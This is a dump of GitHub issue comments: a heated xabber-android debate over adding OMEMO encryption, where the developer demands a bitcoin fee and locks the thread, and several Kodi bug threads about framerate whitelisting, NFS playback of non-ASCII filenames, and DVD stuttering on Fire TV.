540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False
xabber-android/redsolution/540/394161779,540,"What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye! ",,False
xabber-android/redsolution/540/394163276,540,"@friend earlier we differentiated users interested in encryption in two groups junkies and cryptonerds. However, recently we came to a conclusion that there is also a subset of users who should rather be called cryptojerks. Now, please leave our issue tracker. Forever. ",,False
xabber-android/redsolution/540/394162711,540," Don't know, how I come to your side, sorry. I want to restore my xmpp account in Xabber. I get no answer and must read and read and I do not understand.That's not my mistake, but a bad help menagement. Good by! Developer -) HmHB Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Buntbart notifications@friend.com Datum 03.06.18  1516  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye! — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 What a bunch of nonsense! Developers want money in advance for code they don't want to write, don't think it makes sense and aren't allowed to offer. Then they accuse their more interested customers for the mistakes of overtaxed noobs and find that funny. Why is this discussion not simply closed if you do not want to fulfil this desire for OMEMO? By the way, thanks to Liberapay I donate regularly for the further development of my xmpp client. However, this is another app that OMEMO already masters and does not abuse its users as junkies. So, what am I doing here? Waiting for Godot? Goodbye!""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Buntbart"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False
xabber-android/redsolution/540/394163732,540,@friend don't worry about that. Just send us email to support@friend.com with details of your account. ,,False
xabber-android/redsolution/540/394163353,540,"Sorry where I  an delete the part of discussion? Developer we need, they our future. ;-). Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Paul Schaub notifications@friend.com Datum 03.06.18  1448  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request. @friend Can you later delete this part of the discussion? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request.\r\n\r\n@friend Can you later delete this part of the discussion?""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Paul Schaub"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False
xabber-android/redsolution/540/394164444,540,"Wtf happened here? @friend could not you please delete the comments added by @friend, which have this huge bunch of email stuff there? And yeah, I'd also suggest to close this issue here. (maybe even lock it – it may be better wink) You seem to not want to implement it, or better can't, because of the legal things discussed before, so leave it as it. Users wanting to use OMEMO should use a different client. And I better unsubscribe this issue… ",,False
xabber-android/redsolution/540/394176494,540,"All users should use other client, as thankfully E2E encryption is finally starting to be enabled by default, so this client is starting to be incompatible with modern clients such as Conversations. ",,False
xabber-android/redsolution/540/394177898,540,"@friend yeah, Conversations users were very happy when they were forced to have that e2e bullshit forced on them. Processone even changed default config in so OMEMO encryption in Conversations wouldn't work out of the box in ejabberd. ",,False
xabber-android/redsolution/540/394178489,540,"I was not Converastions user before OMEMO was turned on by default by I am one now and I am very happy that it is forced on users. Unfortunately not everyone cares about e2e and that is fine when two such people communicate. But it is a pain to explain to people how to configure and/or use it as a person who actually cares about privacy. So yeah, even companies like Whatsapp got the memo and enabled e2e by default. And XMPP, which should have been leading the charge is lacking behind, because all the developers can't agree about anything except basic message sending. Here it is OMEMO, Conversations don't want to implement eCards because I don't know... It is ridiculous. I am not surprised XMPP never caught on. ",,False
xabber-android/redsolution/540/394179491,540,"@friend if you care about privacy, run your own server and communicate within it. The only persons e2e helps against are admins of yours and your chat buddy's servers. But while encryption brings users a false sense of security it also breaks a lot of things that are really important in real life, like server-side history search and device convergence. ",,False
xabber-android/redsolution/540/394184167,540,"So you want to keep all your very safely transmitted messages decrypted on your pocket device? Lol. So if it gets lost, stolen or taken from you, whoever gets access to device will have all your data. So by trying to eliminate one security risk you introduce many others much more severe. What you don't get is that security and convenience don't fit together well. Encryption nerds lull themselves to be safe because they pressed some magic buttons in some app, only to get hacked via some security hole totally not related to message encryption protocol. Heard about that recent Signal code injection bug? ",,False
xabber-android/redsolution/540/394182294,540,"First of all, e2e if done right is the only thing that can even start to provide some security. What would be the point? I would not trust myself to run it properly. All my friends would have to use my server or their own, both of which is impractical. The server can't be at my home because village internet and having it at a datacenter ruins the point. I really don't understand how it breaks device convergence and modern devices are powerful enough to run client-side searches, so who cares. ",,False
xabber-android/redsolution/540/394250224,540,"I don't get why you are still discussing. If you read the backlog, you can see that both sides already brought every point up against each other. Xabber devs are not going to implement OMEMO in Xabber by themselves, no matter what great arguments you bring up. If you want OMEMO in Xabber, fork it and do it yourselves ) Xabber is based on Smack and Smack does have a module for that. ",,False
xabber-android/redsolution/540/394254525,540,@friend money is good enough argument. I think we could do this for just 1₿ ;) ,,False
xabber-android/redsolution/540/394234490,540,"First of all, if nothing else, FDE. Second of all, what the hell is your point? Yes, if someone can walk up to me and get my device, they will get my messages, whether they are e2e encrypted or not as long as I store them (which I don't have to do for the sensitive ones). But for one, I can delete them and be reasonably sure they are deleted unlike with servers, which I can only hope they are doing something. And walking to me and taking my phone is a one time thing. With unencrypted messages, they can monitor them long term. As for code injection bug, sure. How does not encrypting messages prevent that? OPr should we just give up, because once in a while, there is a one time bug that almost no-one will be affected by? ",,False
xabber-android/redsolution/540/394267328,540,"And once more, attacks on server are many many times easier than on your phone.  Who told you that? Did you ever think that all your assumptions are based on wrong ideas? It does if you care to do some things to prevent access to message history. We actually implemented it for one of our customers, who really cares about security, and does not only pretends to be caring like most folks here. Speaking of spreading bullshit, that's exactly why I respond to all this massive outcry to encrypt everything instead of locking it down. Desire to encrypt everything is silly, and most sane developers know this, except those few who promote it as the main feature of their applications. btw, I wonder if all emails on that Gmail mailbox of yours are encrypted too, or is your e2e crusade  targeted only at chats? ",,False
xabber-android/redsolution/540/394253476,540,"That can be quite routinely unlocked by any party that is really interested in getting what's inside. Encrypting database is a bit better, we do it for one of our customers. Point is that crypto-fetishists like the feeling of being secure, but when talking about providing themselves real security, nope, that's too hard to keep own server and control all communications. You introduce many more security risks to disclosure all your preciousss data to a potential attacker (or thief) by carrying it with you all the time, but you choose to be oblivious to those risks, pretending instead that e2e is the final solution to privacy (while running this perfectly secure messenger on an Android phone). And because real security is too damn hard and requires discipline and dedication, users don't really want that, opting for a cosy feeling of being safe. ",,False
xabber-android/redsolution/540/394262038,540,"I specifically said the opposite, that it is just the first step. And once more, attacks on server are many many times easier than on your phone. Having them on the server does not protect them unless you log out every time you close the app. It is irrelevant to whether e2e should be used, as this can be solved by encrypting the database. I honestly don't care much. I gave up on xabber as I wrote. I just thought I should reply here to prevent someone from buying the anti-encryption BS that is spreading around. E2E is not the whole solution, but it is certainly part of it. The most important first step, as while E2E does not provide perfect security by far, it decreases your attack surface massively. ",,False
xabber-android/redsolution/540/394461270,540,"@friend no excuse, really? Just one thing, like the capability to have a nice history search in a web client, is a deal breaker for almost anyone who does some real work with XMPP. ",,False
xabber-android/redsolution/540/394413385,540,"You misrepresent what I wrote. I have PGP set up and my PGP key published, ready to send or recieve encrypted mail. I just deem it ""unreasonably hard"" to ask other people to use it when there is a better solution (IM). I am certainly not ashamed to ask everyone to use IMs that are encrypted by default, as that is literally ZERO effort on their side. There is no excuse not to use encrypted IM these days, as there is virtually no inconvenience (if well implemented). That is my point. ",,False
xbmc/xbmc/14675/431998189,14675,Have you enabled Whitelisting? Also you did not follow our issue template ,,False
xbmc/xbmc/14675/372711120,14675,"Auto framerate change broken in Kodi 18. When I play 1080/50i video in Kodi17, it's change framerate on TV. There is nothing happens in Kodi 18, both x32 and x64. Fullscreen mode (not windowed) and autochange are enabled in settings. But fullscreen mode not work too, it's look like windowed mode forced. There is no ""SetFullScreenInternal"" in Kodi 18 log, like in 17. kodi17.log kodi18.log ",,False
xbmc/xbmc/14675/432125234,14675,"you realize that v18 is still not released, right? When implementing the whitelist approach (because of user demand) we decided to do some additional changes to prevent your issue, but unfortunately forgot about it after the feature got in (so many things had been going on in that time). So 👍 for the reminder and 👎 for not writing a proper bug report using our template and another 👎 for your last comment. ",,False
xabber-android/redsolution/540/394662451,540,"@friend Great, so somehow we got from it being useless and bad for security all the way to, it disables one feature and only in webclients, who can't easily do OMEMO properly anyway... Are you trying to argue something or just throwing stuff around? ",,False
xabber-android/redsolution/540/394668241,540,"@friend I never told it's totally useless. But the desire to force everyone to press a magic button and pretend they are totally safe and secure is silly. It also breaks not 'one feature' but a number of killer features, like good device sync and server search, which are of paramount importance. And downloading all history from a server to client perform a search is not just stupid, but ultra-stupid. Anyway, you are totally free to do whatever you like, use whatever products you like, create whatever software you like, just don't try to press me into buying this bullshit about e2e and infect me with this crypto-cancer. For any capable user who really cares about security absolutely same security level can be achieved by running own server without e2e, all without losing all the other features we're working on. And I'll go on creating software as I like it and as my customers require it - and so far we didn't have any customers who would pay us for development of OMEMO in Xabber. You see, there is no real market demand for that, unlike, say, iOS version of Xabber, proper group chats or voice and video calls and fast device synchronization that we're working on now. Hope that makes my argument clear. Official public offer Anyone who wants us to add OMEMO functionality to Xabber for Android should pay us 1 bitcoin. Adding it to iOS and Web version would cost additional 0.5 bitcoin each. With this, I'm locking down this thread until further notice. ",,False
xbmc/xbmc/14809/377832987,14809,"   Bug report Describe the bug I can't play some mp4 and vob files. Files are not corrupted.     Your Environment Used Operating system    [x] Android [ ] iOS [ ] Linux [ ] OSX [ ] Raspberri-Pi [ ] Windows [ ] Windows UWP  Operating system version/name  Kodi version 18 rc1   note Once the issue is made we require you to update it with new information or Kodi versions should that be required. Team Kodi will consider your problem report however, we will not make any promises the problem will be solved. ",,False
xbmc/xbmc/14675/432002406,14675,Jeez stop whining.  With that attitude no one will care to even try to improve it. Also no one forced you to update so you can of course blame yourself ,,False
xbmc/xbmc/14809/436266809,14809,Please read  how to submit logfiles. ,,False
xbmc/xbmc/14809/436754465,14809, is one whish I can't play. ,,False
xbmc/xbmc/14809/436243295,14809,"I don't know how to upload log from Shield device. I need some time to upload files. wt., 6 lis 2018, 1355 Martijn Kaijser notifications@friend.com napisał(a) ",,False
xbmc/xbmc/14809/436242639,14809,Where's the debuglog that was asked and sample files? A screenshot is useless ,,False
xabber-android/redsolution/540/394321258,540,"@friend thank you for proving my point with your own confession. Everything you write boils down to this you yourself preach encryption everywhere, yet, you yourself use in only when it is convenient enough (or ""not unreasonably hard""). And, since e2e is convenient enough for you, you want to force everyone to your level of convenience, and you don't really care if they want it or not. That, my friend, is hypocrisy. You see, I don't totally oppose the idea of encryption. It should be used when it is appropriate. It is nicely done in best messaging service out there - Telegram. It uses 'super reliable encryption' as it's marketing gimmick, yet, users love Telegram, not for their encrypted chats (that don't even work across all platforms, by the way), but because it works seamlessly on all their desktops, tablets and browsers, because you can search history, because it has great group chat experience. All of this is possible only because Telegram does what WhatsApp and Viber do not try to do (for reasons beyond my understanding) - it stores all users archives on central servers. And encrypted secret chats are used very sparingly in it, only when specifically enabled. That is a sane model that merges security and convenience in a good enough proportion, and users like it. That's what we're going to build too, one day. And you are pushing everyone to use e2e whether they like it or not. ",,False
xabber-android/redsolution/540/394311659,540,"targeted only at chats? I have PGP set up for email, but I practically never use it, because it is more convenient to switch to a secure IM. Using PGP for mail is just unreasonably hard and there is no reason not to use IM (use best tool for the job). Maybe I am not a sane developer, but I don't believe this. Maybe my assumptions are wrong or maybe yours are. Yes, but I never found a flaw in them. But considering you seem to be knowledgeable in the topic, you can point out my error if you see any. Here are my asumptions  There is no practical way a server can improve security in case of device compromise beyond what encryption can do. Reasoning for that is The only security feature reliant on server I ever heard of in connection with IM is protecting the chat history with additional passphrase. This can be done using encryption for example like this. Let Km be master key derived from sufficiently strong passphrase by sufficiently slow KDF. Let K0 be randomly generated key. Store K[0] in file encrypted by Km. Generate future keys K[i] = H('1' + K[i-1]). Generate K[1] and destroy K[0] (form memory). Keep n starting from 1 as message counter. When a message is supposed to be protected by passphrase (is old enough), encrypt it with K[n], generate K[nplus one] and store it. Throw away K[n].  Increment n. Your messages are encrypted and you need to enter the passphrase to decrypt them. To optimize this, after decrypting them for the first time, you can store them in the file encrypted by Km directly and replace K[0] with the current K[n] (+ increment the current n). This is just as resistant to device compromise as server side protection. If a malware is inserted, it can gain future messages in both cases and if passphrase is entered into infected device, it can be captured in both cases. Old messages can't be retrieved from stolen device without passphrase in both cases. Of course there may be other features I never heard of. If there are, please name at least one. But even then, they are not much use if they are not commonly implemented.  Trusting server in addition to the client (phone) creates new attack vector and therefore increases the attack surface. E2Ee mitigates this, as the server does not have to be trusted.  The assumptions 1 and 2 together mean E2Ee can only improve security, not weaken it.  Regular users who don't know a server provider can't verify providers trustworthines.  Only very few users (insignificant amount) have the skills, resources and time to run their own server. I don't believe I would be able to keep up with all the latest in security of servers let alone pay for all the equipment and SW such as firewalls, IDS... Even then, it is a lot of spent time and resources for something that can be better achieved by E2Ee.  Assumptions 4 and 5 together mean, that most users can't trust the server they use.  Even users running their own server securely can't easily trust the server of the other communicating party.  If trust is ever eroded in the server for some reason or just plainly better option arisses, it is not trivial to move to a new server as all your contacts need the new ID and you need to changed it wherever it is shown (which if it is somewhere written down in physical format may be near impossible).  Having a secure server only adds security to E2E scheme, it is not mutually exclusive. You can for example store the encrypted chat history on a server to further secure yourself (both server authentication and encryption would have to be broken to obtain your message history).   ",,False
xbmc/xbmc/14809/437080565,14809,@friend your files simply cannot be accessed ,,False
xbmc/xbmc/14809/436761173,14809,Which kodi version do you use? ,,False
xbmc/xbmc/14809/436761310,14809,"kodi 18 latest nightly. without a debug log, nobody can help you! ",,False
xbmc/xbmc/14809/437082475,14809,I can play few files from this folder and few don't. I know know what's going on. In kodi 17 I'm able to play them all. So where should I look for solution? In pc NFS share settings? ,,False
xbmc/xbmc/14809/436775360,14809,"Could we please see a debuglog, now? You could also use the Logfile Uploader add-on to do so. That simply takes only a few moments. We can't help you without that Logfile and your issue might get closed without it. Thanks in advance ",,False
xbmc/xbmc/14809/436267522,14809,"Ok thank you. BTW I'm able to play those files on kodi 17. wt., 6 lis 2018, 1515 DaVukovic notifications@friend.com napisał(a) ",,False
xbmc/xbmc/14675/432002108,14675,"WTF is Whitelist ? Why it's empty by default ? Where it placed ? Why google not found it ? Why you broke years-worked setup and add hidden 'feature' and there is no information or attention in download section about this incompatible issue ? You can warn users in ""Download"" section, you can warn users on installation phase, you can open whitelist tab on first run, you can show some window on playstart with attention ""This resolution and framerate not in whitelist, do you want to add now?"" Instead, you simple do nothing, and every user spent weeks to find this error or to rollback to previous version. Too bad, Kodi, too bad. ",,False
xbmc/xbmc/14809/437086846,14809,"I think this can be better taken to the forums, perhaps somewhere there can help you track down your NFS issues. ",,False
xbmc/xbmc/14809/437087225,14809,"@friend had similiar problems in 2012 with, just found an old support ticket, ",,False
xbmc/xbmc/14809/437569197,14809,"Post a log for both please. Am Sa., 10. Nov. 2018, 0941 hat kolunio82 notifications@friend.com geschrieben ",,False
xbmc/xbmc/14809/437568490,14809,I tested on the shame shield tv device in the same my home network. Only change is replace kodi 18 to 17 from Google play. ,,False
xbmc/xbmc/14809/437088144,14809,I use hane winnfs server and I'm almost sure that settings are fine. ,,False
xbmc/xbmc/14809/437560218,14809,"Rather looks like your setup as it works for others using NFS. Am Fr., 9. Nov. 2018 um 2231 Uhr schrieb kolunio82  notifications@friend.com --                     Key-ID     0x1A995A9B                keyserver pgp.mit.edu  ============================================================== Fingerprint 4606 DA19 EC2E 9A0B 0157  C81B DA07 CF63 1A99 5A9B ",,False
xbmc/xbmc/14809/437584916,14809,"this one, right nfs//192.168.1.31/z/movies/MUSIC/Ti�sto - Live @ Tomorrowland 2017 (1080p_25fps_H264-128kbit_AAC).mp4 ? Wondering if � has something to do with it in comparison to v18 log @friend If you rename this one to Tisto - Live at Tomorrowland 2017.mp4 does it start to work? ",,False
xbmc/xbmc/14809/437587709,14809,Nope crashes to desktop. ,,False
xbmc/xbmc/14809/436760473,14809,"hello, just downloaded you file and its playing fine. (Nvidia Shield - OS Ver 7.1 - Oreo 8.0) do you have access from your pc to the shield? then go to this folder internal\Android\data\org.xbmc.kodi\files\.kodi\temp - there is the log ",,False
xbmc/xbmc/14809/437083928,14809,"NFS3ERR_NOENT(-2) means file not found, or like Irusak said, its not accessable. this could mean wrong rights or files are moved somewhere. when i told you its working for me, i tried that too over NFS from my nas with NFS V3 ",,False
xbmc/xbmc/14809/437591147,14809,Ok I know what is wrong but I don't know how to fix this. When filename contains other letter than from English I can't play the file. I replace Tiësto to Tiesto and it works. ,,False
xbmc/xbmc/14809/437591198,14809,"@friend i have downloaded this file and tested on my shield, file location is on qnap nas with nfs. for me its working.. @friend  i think its logcat he wants, download adblink and enable in shield under developer options network-debugging. then  with adblink open ADB shell. logcat -d -f /scdard/logcat.txt ",,False
xbmc/xbmc/14809/437591320,14809,"@friend good - this is what I asked you above. So in short we have an issue with passing the ""correct"" encoding so that it is understood by the other side ... @friend logcat is not needed. The error is clear now. It's this  ",,False
xbmc/xbmc/14809/437591608,14809,So there is a easy way to fix this? I tried to change language settings in kodi but doesn't work. Also I tired to change filenames display mode in server settings from UTF-8 to windows ansi. But when I change to ansi kodi doesn't see files with others characters at all. ) ,,False
xbmc/xbmc/14809/437592475,14809,"@friend ok, its the ë that couse this problem....but why is it working for my nvidia shield with android and qnap nfs? i did not renamed the file ",,False
xbmc/xbmc/14809/437592213,14809,"Nope - no easy fix. I pinged the guys on IRC. Let's see ... still wondering why it only misbehaves on Android and other kodi v18 work with the same NAS. I did not expect that this is ""platform specific"" code. ",,False
xbmc/xbmc/14809/437592722,14809,You really ask? -) ... It's Microsoft on the other side ... ,,False
xbmc/xbmc/14809/437588117,14809,"Mmh - works from non Android kodis, right? If you could provide an adb log that would be really helpful ",,False
xbmc/xbmc/14809/437620120,14809,is you server on latest version? ,,False
xbmc/xbmc/14809/437620295,14809,"ok, then you have to wait, until fritsch talked to the guys on IRC. @friend why do you think the problem is only on android. did i miss something here? ",,False
xbmc/xbmc/14809/437620820,14809,I don't think this is only android problem. Tomorrow I will try kodi 18 on windows 10 and I'll let you know. ,,False
xbmc/xbmc/14809/437501526,14809,I tried today kodi 17 from Google play on shield tv and on my smartphone. On both devices I can play those files without any problems. So there is something wrong in nfs share support implementation in kodi 18. ,,False
xbmc/xbmc/14809/437621266,14809,"I don't think it is only Android, but for now no one told differently. So based on the information in this bugreport it's Android + Windows NFS for now - in this combination. It even worked with just ""changing"" the NFS server to a QNAP one. So most likely it won't work with kodi v18 on Windows as well in combination with THIS nfs server. We will see. As I neither use Microsoft Windows nor Android with a Windows NFS - I cannot really reproduce. ",,False
xbmc/xbmc/14809/437594546,14809,So the question is why KODI 17.6 can play those files and KODI 18 don't. ) ,,False
xbmc/xbmc/14809/442023714,14809,"Did you test that already? If so, what was the result and where is the matching debuglog then? ",,False
xbmc/xbmc/14809/437592765,14809,") ok i understand, thank you ",,False
xbmc/xbmc/14809/442095040,14809,Latest kodi build win x64.   with english characters works. Withs any others than english don't. ,,False
xbmc/xbmc/14809/442593359,14809,Why bug is marked as invalid? I had still this problem in kodi windows and in kodi Android. ,,False
xbmc/xbmc/14809/441974239,14809,So I still have this problem and It's not fixed. ,,False
xbmc/xbmc/14809/442935570,14809,Forgive me please but I don't understand exactly what should I do now? I posted log from kodi Android and kodi windows 10 and I'n both of them I have the same problem. So I should ask people on forums if they have the same problem as I? ,,False
xbmc/xbmc/14809/445919361,14809,"What is the link to your forum thread you opened so we can help you find enough info to fix it  - (whether that is in hanewin or in Kodi does not matter really ) I offered help a few times and said there is not enough info for this ticket. I have been nothing but clear about the need to open a thread on the forum for this, so the issue can be reproduced. You keep posting partial (and not nearly enough) information here, and now have added a more than unwelcome negative attitude on top of it. I'll give you a last chance to open a forum thread and link to it here. After that I will simply close communication as I prefer not to deal with people who are not willing to work together  to solve an issue. ",,False
xbmc/xbmc/14809/442931616,14809,"I marked it invalid 21 days ago and told you to go to the forums. Until we verify this is an actual Kodi bug, it really has no place here. That being said, on the forums there will be most likely some people willing to assist. ",,False
xbmc/xbmc/14809/442939107,14809,"You should go there, open a thread and ask people to help you troubleshoot why your NFS server has incompatibility with Kodi 18. For reference, myself and loads of others are opening files with crazy characters from all kinds of NFS servers with Kodi 18. You haven't convinced us it is not a bug with haneWin. (I would say we are only getting more and more convinced it is.) We can definitely help you troubleshoot why it becomes visible in 18 and not 17 though - for this you will likely need to do a lot more testing, so prepare your debug logs. It would also be extremely valuable if someone could reproduce the bug and help you troubleshoot. The forum is the place to do this - especially since every comment here spams everyone involved. Github issues is not a replacement for the support forum - it is for technically reporting errors with Kodi code that need to be fixed. ",,False
xbmc/xbmc/14809/445912985,14809,"From HaneNFS serwer author ""tested an elder VLC on Andorid 4.4 and the latest vlc version on Android  8.0 without any problems. I also verified that non ASCII characters are  ok in VLC on Android. Best regards, Herbert Hanewinkel"" So if HanesNFS works without any problems as nfs server for VLC answer for me is obvious - kodi is responsible for error. Another proof is that kodi 17.6 works fine and 18 don't. Fix your software and don't blame haneNFS. ",,False
xbmc/xbmc/14809/445923973,14809,I've done this arleady -  I show you video with error step by step -  should I give you more? ,,False
xbmc/xbmc/15405/459977839,15405,Out of curiosity I installed Kodi 18.0 on my phone (Moto G6 plus running Android 8.0) and my tablet (Google Pixel C running Android 8.1). I was not able to reproduce the problem there. So it seems that the issue is related to the Amazon Fire TV. ,,False
xbmc/xbmc/15405/460048909,15405,"Well, now you have me screaming and shouting ... How about a switch like ""Disable Mediacodec when playing DVDs""? ",,False
xbmc/xbmc/14809/445929175,14809,"Nothing. This ticket is closed for communication, and we can reopen it when we have enough information collected (through the thread) to actually fix something - if the issue is indeed in Kodi. EDIT I just looked at your thread and it contains even less information than the sparse information in this ticket. I suggest you reread everything I said so far, and create a support thread in the forum, or edit your previous thread and forum title. Post as much information as you can in it and hope someone can reproduce it. I will reiterate it once more We can not reproduce the issue with any normal NFS setup so far. It is cool you got someone to test another app and this NFS server, but it is no definitive answer. To highlight this   several of our team tested the same app and another NFS server and there are no issues either. This means there is some weird incompatibility specific between HaneWin NFS with your settings in it + Kodi 18 with your settings in it. This will require a lot of testing on your part. ",,False
xbmc/xbmc/15405/405995848,15405,"Bug report Describe the bug I am running Kodi 18.0 as a fresh install on an Amazon Fire TV 3rd gen (2017). When I try to play DVD files (VIDEO_TS.IFO) the movie stutters. It doesn't matter if I install over 17.6 or uninstall 17.6 beforehand for a fresh install. It doesn't matter if I play from SMB (Gigabit ethernet, so no speed problem) or from a local directory (/sdcard/Movies). This worked fine with Kodi 17.6 before. Other movie types (i.e. MKV) are running fine. Expected Behavior DVD videos play smoothly. Actual Behavior DVD videos start to play, then stutter. Audio stutters a little later (after 10 seconds). To Reproduce Steps to reproduce the behavior  Use Amazon Fire TV 3rd gen (2017) Copy a DVD structure below /sdcard/movies AUDIO_TS VIDEO_TS VIDEO_TS\VIDEO_TS.IFO VIDEO_TS\VTS_01_0.IFO VIDEO_TS\VTS_01_1.VOB VIDEO_TS\VTS_01_2.VOB ... Install Kodi 18.0. Add /sdcard/movies as Data source Play the movie. It stutters.  Debuglog The debuglog can be found here  Environment Used Operating system  [x] Android  Operating system version/name Amazon AFTN with Android 7.1.2 API level 25  Amazon software version Fire OS 6.2.5.8 (NS6258/1607) Kodi version 18.0 Git20190128-d81c34c  ",,False
xbmc/xbmc/15405/459979533,15405,"Jep - mediacodec is as stable as the vendor implementation -) On your FireTV try to disable ""Mediacodec and Mediacodec Surface"" before playing the DVD please. Don't forget to turn it on again afterwards. ",,False
xbmc/xbmc/15405/459987125,15405,"No - in v17. Mediacodec was disabled by default for DVDs. Some forum users forced us to enable it by default - screaming loud and shout, you know. ",,False
xbmc/xbmc/15405/460053275,15405,Nope - we rather want that FireTV people just fix their decoder -) ... and this won't happen if we add workaround after workaround. ,,False
xbmc/xbmc/15405/460066231,15405,We can expect a lot of thing from Amazon. We also expect users to understand why we do certain things (do not workaround broken firmware by adding stupid switches).  We did not make the decision for you to buy an Amazon device that has clearly not been designed to play such files. So i suggest to find some other device then. ,,False
xbmc/xbmc/15405/460070381,15405,"Your argumentation is fully correct. Perhaps amazon did not even try to fix it, cause we had it off in the past ... pure speculations. I don't like when users suffer though. Okay with a custom v18 build that disable Mediacodec for mpeg-2? ",,False
xbmc/xbmc/15405/460069101,15405,"Actually, we are at a point where a perfectly working feature has been removed from Kodi between 17.6 and 18.0. I prefer to not throw around the word ""stupid"" but deleting something that made Kodi work out of the box for anything thrown at it and instead have users fiddle around in advanced settings does not look like a completely mature and understandable decision to me. I do not know how I deserve to be treated in that manner. I asked politely about the circumstances and after I read the facts that have been told here I asked politely to add a switch that brings back a deleted feature. Also I disagree about the FireTV ""clearly not been designed to play such files"". Kodi on FireTV played them perfectly until 17.6. It does play them perfectly in 18.0 if I fiddle around in advanced settings. My request is to reduce the necessary fiddling. The Wiki ( says ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."" That sounds like the mere definition of ""FireTV"" to me. We all know that Android is a heterogeneous market. Nearly every device has this or that shortcoming. No reason to throw the FireTV out of the window. ",,False
